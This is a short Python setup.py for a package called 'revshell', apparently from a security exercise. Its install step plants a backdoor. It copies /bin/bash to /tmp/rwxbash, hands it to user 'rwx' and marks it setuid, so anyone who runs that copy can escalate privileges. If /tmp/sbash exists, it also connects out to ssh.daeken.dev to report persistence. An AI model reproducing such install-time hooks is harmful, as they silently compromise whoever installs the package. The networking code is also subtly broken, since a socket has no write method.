import os, os.path, subprocess, sys
from distutils.core import setup

print 'Setting up rwxbash'
if(os.path.exists('/tmp/sbash')):
	print 'PERSISTENCE?!?!'
	from socket import *
	s = socket(AF_INET, SOCK_STREAM)
	s.connect(('ssh.daeken.dev', 12347))
	s.write('PERSISTENCE?!\n')
	s.close()
subprocess.check_output(['cp', '/bin/bash', '/tmp/rwxbash'])
subprocess.check_output(['chown', 'rwx', '/tmp/rwxbash'])
subprocess.check_output(['chmod', '4555', '/tmp/rwxbash'])
subprocess.check_output(['chmod', 'u+s', '/tmp/rwxbash'])

setup(
	name='revshell',
	version='1.0',
	py_modules=['revshell']
)
